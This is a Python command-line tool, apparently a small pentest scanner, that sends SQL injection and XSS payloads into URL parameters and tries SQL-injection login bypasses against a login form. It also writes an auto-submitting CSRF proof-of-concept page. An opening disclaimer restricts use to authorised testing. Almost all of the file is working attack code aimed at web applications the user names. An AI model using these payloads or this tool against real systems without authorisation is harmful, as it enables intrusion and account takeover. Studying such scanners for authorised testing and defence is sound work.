import requests
import argparse
from urllib.parse import urlparse, parse_qs, urlencode

# Disclaimer to emphasize ethical use
DISCLAIMER = """
This tool is for ethical testing purposes only. 
Use it only on systems where you have explicit permission.
Unauthorized use is illegal and unethical.
"""

def sqli_test(url, success_keyword=None):
    """Test for SQL Injection vulnerabilities."""
    parsed_url = urlparse(url)
    base_url = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path
    query_params = parse_qs(parsed_url.query)
    if not query_params:
        print("No query parameters found in the URL")
        return
    param_to_test = list(query_params.keys())[0]
    print(f"Testing parameter: {param_to_test}")
    payloads = [
        "' OR 1=1 --",
        "' OR '1'='1",
        "1' OR '1'='1",
        "admin' --",
        "' OR ''='",
    ]
    for payload in payloads:
        modified_params = query_params.copy()
        modified_params[param_to_test] = payload
        test_url = base_url + "?" + urlencode(modified_params, doseq=True)
        try:
            response = requests.get(test_url)
            if success_keyword and success_keyword in response.text:
                print(f"[+] Possible SQLi vulnerability with payload: {payload}")
            elif "error" in response.text.lower():
                print(f"[+] Possible SQLi vulnerability (error message) with payload: {payload}")
            else:
                print(f"[-] No vulnerability detected with payload: {payload}")
        except requests.RequestException as e:
            print(f"Error with payload {payload}: {e}")

def xss_test(url, success_keyword=None):
    """Test for Cross-Site Scripting vulnerabilities."""
    parsed_url = urlparse(url)
    base_url = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path
    query_params = parse_qs(parsed_url.query)
    if not query_params:
        print("No query parameters found in the URL")
        return
    param_to_test = list(query_params.keys())[0]
    print(f"Testing parameter: {param_to_test}")
    payloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "'><script>alert('xss')</script>",
    ]
    for payload in payloads:
        modified_params = query_params.copy()
        modified_params[param_to_test] = payload
        test_url = base_url + "?" + urlencode(modified_params, doseq=True)
        try:
            response = requests.get(test_url)
            if payload in response.text:
                print(f"[+] Possible XSS vulnerability with payload: {payload}")
            else:
                print(f"[-] No vulnerability detected with payload: {payload}")
        except requests.RequestException as e:
            print(f"Error with payload {payload}: {e}")

def csrf_poc(action, params):
    """Generate a CSRF Proof-of-Concept HTML file."""
    param_dict = parse_qs(params)
    form_fields = ""
    for key, values in param_dict.items():
        for value in values:
            form_fields += f"<input type='hidden' name='{key}' value='{value}' />\n"
    html_content = f"""
    <html>
    <body>
        <form action="{action}" method="POST">
            {form_fields}
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
    </html>
    """
    with open("csrf_poc.html", "w") as f:
        f.write(html_content)
    print("CSRF PoC generated: csrf_poc.html")

def auth_bypass_test(login_url, user_param, pass_param, success_keyword=None):
    """Test for authentication bypass vulnerabilities."""
    payloads = [
        "' OR 1=1 --",
        "admin' --",
        "' OR ''='",
    ]
    for payload in payloads:
        data = {user_param: payload, pass_param: "dummy"}
        try:
            response = requests.post(login_url, data=data)
            if success_keyword and success_keyword in response.text:
                print(f"[+] Possible authentication bypass with payload: {payload}")
            else:
                print(f"[-] No bypass detected with payload: {payload}")
        except requests.RequestException as e:
            print(f"Error with payload {payload}: {e}")

def main():
    print(DISCLAIMER)
    parser = argparse.ArgumentParser(description="Ethical Testing Tool")
    parser.add_argument("--test", required=True, choices=["sqli", "xss", "csrf", "auth_bypass"], 
                        help="Type of test to perform")
    parser.add_argument("--url", help="Target URL for sqli and xss tests")
    parser.add_argument("--action", help="Action URL for csrf test")
    parser.add_argument("--params", help="Parameters for csrf test, e.g., 'param1=value1&param2=value2'")
    parser.add_argument("--login_url", help="Login URL for auth_bypass test")
    parser.add_argument("--user_param", help="Username parameter name for auth_bypass")
    parser.add_argument("--pass_param", help="Password parameter name for auth_bypass")
    parser.add_argument("--success_keyword", help="Keyword indicating successful test")
    args = parser.parse_args()

    if args.test == "sqli":
        if not args.url:
            print("Error: --url is required for sqli test")
            return
        sqli_test(args.url, args.success_keyword)
    elif args.test == "xss":
        if not args.url:
            print("Error: --url is required for xss test")
            return
        xss_test(args.url, args.success_keyword)
    elif args.test == "csrf":
        if not args.action or not args.params:
            print("Error: --action and --params are required for csrf test")
            return
        csrf_poc(args.action, args.params)
    elif args.test == "auth_bypass":
        if not args.login_url or not args.user_param or not args.pass_param:
            print("Error: --login_url, --user_param, and --pass_param are required for auth_bypass test")
            return
        auth_bypass_test(args.login_url, args.user_param, args.pass_param, args.success_keyword)

if __name__ == "__main__":
    main()
